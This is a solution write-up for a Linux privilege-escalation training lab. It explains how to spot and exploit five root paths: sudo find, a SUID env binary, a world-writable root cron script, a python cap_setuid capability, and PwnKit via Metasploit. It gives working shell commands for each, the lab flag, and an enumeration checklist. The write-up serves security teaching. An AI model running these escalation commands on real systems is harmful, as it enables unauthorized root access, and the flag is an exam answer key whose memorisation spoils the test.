---
tags: [css-exam, module-9, privesc, linux, gtfobins, pkexec, metasploit, solution]
---
# Privilege Escalation Lab — Solution (with the "how did I spot it")

Five independent ways to go from `www-data` to `root`. Any **one** is enough. For each vector:
**what you see** in the enum file → **how you'd spot it** → the **exploit** → how you **verify** it worked.

> Exam reflex: after any foothold, check these five in order — **sudo → SUID → capabilities → cron → kernel/OS**. That order maps 1-to-1 onto the files below.

## Vector 1 — a sudo command you can run as root — `enum/sudo_l.txt`

**What you see:**

```
(root) NOPASSWD: /usr/bin/find
```

**How to spot it:** `sudo -l` lists what you're allowed to run as another user. `(root) NOPASSWD: …`
means you can run that program **as root, no password asked**. Then ask one question: *can that program
launch another command?* `find` can (via `-exec`) — so it's game over.

**Exploit:**

```
sudo find . -exec /bin/sh \; -quit      # -exec runs /bin/sh AS root; -quit stops after the first hit
id                                       # -> uid=0(root)
```

(The other entry, `sudo less /var/log/syslog`, is also abusable: run it, then type `!/bin/sh`.)

## Vector 2 — a SUID program that shouldn't be one — `enum/suid.txt`

**What you see:**

```
-rwsr-xr-x 1 root root /usr/bin/env     # the 's' in "rws" = the SUID bit
```

**How to spot it:** a SUID binary always runs **as its owner (root)**, no matter who starts it. A few
need it (`passwd`, `sudo`, `pkexec`). `env` does **not** — a root-owned SUID `env` is a planted/mis-set
bug. When you see an odd binary in the SUID list, check GTFOBins for its "SUID" trick.

**Exploit:**

```
/usr/bin/env /bin/sh -p                  # env launches a shell; -p stops bash dropping the root euid
id                                        # -> euid=0(root)
```

(Also listed here: `pkexec` → that's Vector 5.)

## Vector 3 — a root cron job you're allowed to edit — `enum/cron.txt`

**What you see:**

```
*  *  * * *  root  /opt/scripts/backup.sh
-rwxrwxrwx 1 root root /opt/scripts/backup.sh     # the trailing "rwx" = ANYONE can write to it
```

**How to spot it:** root runs `backup.sh` every minute, and the permissions `rwxrwxrwx` mean **you can
write to it**. So you append your own command — root then runs it for you on the next tick.

**Exploit:**

```
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/scripts/backup.sh
# wait up to 60s for cron to run it as root, then:
/tmp/rootbash -p                          # a root-SUID copy of bash -> euid=0
```

## Vector 4 — a capability that grants root powers — `enum/capabilities.txt`

**What you see:**

```
/usr/bin/python3.9 = cap_setuid+ep
```

**How to spot it:** capabilities are individual slices of root's power handed to a single binary.
`cap_setuid` lets that binary **change its UID to 0** — i.e. become root — without being SUID. Any
scripting binary with `cap_setuid` is an instant win.

**Exploit:**

```
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
id                                        # -> uid=0(root)
```

## Vector 5 — a known local exploit for this OS — `enum/suid.txt` + `enum/system.txt`

**What you see:**

```
/usr/bin/pkexec          # SUID, in suid.txt
Ubuntu 21.10             # in system.txt
```

**How to spot it:** when a specific program lines up with a specific OS version, check for a public CVE.
`pkexec` on this Ubuntu is vulnerable to **CVE-2021-4034 (PwnKit)** — a famous one-shot local-root bug.

**Exploit:** run the public PwnKit PoC, or use the Metasploit module in the next section.

## The Metasploit half — Meterpreter session → root

You already have a Meterpreter session (say number `1`). Let Metasploit tell you which local exploit fits:

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run                      # lists the local exploits this box is likely vulnerable to
```

Then run one it suggests (PwnKit here):

```
msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 > set SESSION 1
msf6 > set LHOST <your-ip>
msf6 > run                      # -> a new Meterpreter session, this time as root
meterpreter > getuid            # root
meterpreter > cat /root/flag.txt
```

> ⚠️ `getsystem` is a **Windows** command. On Linux you escalate with a **local exploit module**
> (above) or a GTFOBins vector — not `getsystem`.

## The flag

```
FLAG{r00t_via_sudo_find_suid_env_cron_cap_or_pkexec}
```

(The name literally lists the five vectors.)

## The method to memorise

After any foothold, walk this checklist — each line finds one of the vectors above:

```
id                                 # who am I, which groups
sudo -l                            # Vector 1  (sudo)
find / -perm -4000 2>/dev/null     # Vector 2  (SUID)
getcap -r / 2>/dev/null            # Vector 4  (capabilities)
cat /etc/crontab                   # Vector 3  (cron + check writable scripts it runs)
uname -a ; cat /etc/os-release     # Vector 5  (kernel / OS -> known CVE)
```

Map each finding to **GTFOBins**; in Metasploit, `local_exploit_suggester` automates the
"which exploit do I use?" question.
